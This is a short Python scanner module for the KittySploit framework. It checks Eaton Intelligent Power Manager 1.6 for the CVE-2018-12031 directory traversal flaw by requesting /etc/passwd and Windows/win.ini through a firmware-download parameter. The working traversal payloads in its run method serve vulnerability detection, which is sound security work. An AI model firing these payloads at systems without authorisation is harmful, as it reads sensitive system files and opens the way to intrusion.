#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Eaton Intelligent Power Manager v1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Eaton Intelligent Power Manager 1.6 - Directory Traversal Detection',
        'description': 'Eaton Intelligent Power Manager v1.6 allows an attacker to include a file via directory traversal, which can lead to sensitive information disclosure, denial of service and code execution.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'edb', 'lfi', 'eaton', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/EmreOvunc/Eaton-Intelligent-Power-Manager-Local-File-Inclusion',
            'https://www.exploit-db.com/exploits/48614',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-12031',
            'https://github.com/0xT11/CVE-POC',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2018-12031',
    }

    def run(self):
        for path in ('/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../etc/passwd', '/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../Windows/win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:', '\\[(font|extension|file)s\\]',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='critical',
                    reason="Eaton Intelligent Power Manager 1.6 - Directory Traversal detected",
                    path=path,
                )
                return True
        return False

